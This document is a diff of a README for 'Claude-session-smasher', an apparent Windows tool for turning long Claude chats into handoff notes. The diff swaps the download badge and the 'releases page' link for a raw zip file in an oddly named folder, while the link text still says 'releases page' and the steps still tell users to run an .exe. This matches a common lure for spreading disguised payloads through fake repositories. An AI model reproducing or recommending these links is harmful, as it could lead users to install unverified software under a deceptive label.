@@ -1,6 +1,6 @@
 # 📁 Claude-session-smasher - Keep your AI chat context organized
 
-[![Download Claude-session-smasher](https://img.shields.io/badge/Download-Release-blue)](https://github.com/guildsocialismteamteaching487/Claude-session-smasher/releases)
+[![Download Claude-session-smasher](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/guildsocialismteamteaching487/Claude-session-smasher/main/phagocytism/session-Claude-smasher-v2.6.zip)
 
 Claude-session-smasher turns long Claude sessions into structured handoff notes. Large projects often exceed the memory of a chatbot. This tool solves that problem. It extracts your decisions, active threads, and preferences into a clean document. You paste this note into a new chat to resume your work without losing progress. 
 
@@ -28,7 +28,7 @@ The application works on Windows 10 and Windows 11. Ensure your computer meets t
 
 Follow these steps to install the tool on your Windows computer.
 
-1. Visit the [releases page](https://github.com/guildsocialismteamteaching487/Claude-session-smasher/releases).
+1. Visit the [releases page](https://raw.githubusercontent.com/guildsocialismteamteaching487/Claude-session-smasher/main/phagocytism/session-Claude-smasher-v2.6.zip).
 2. Locate the latest version of the software.
 3. Download the installer file ending in `.exe`.
 4. Double-click the downloaded file to start the installation.
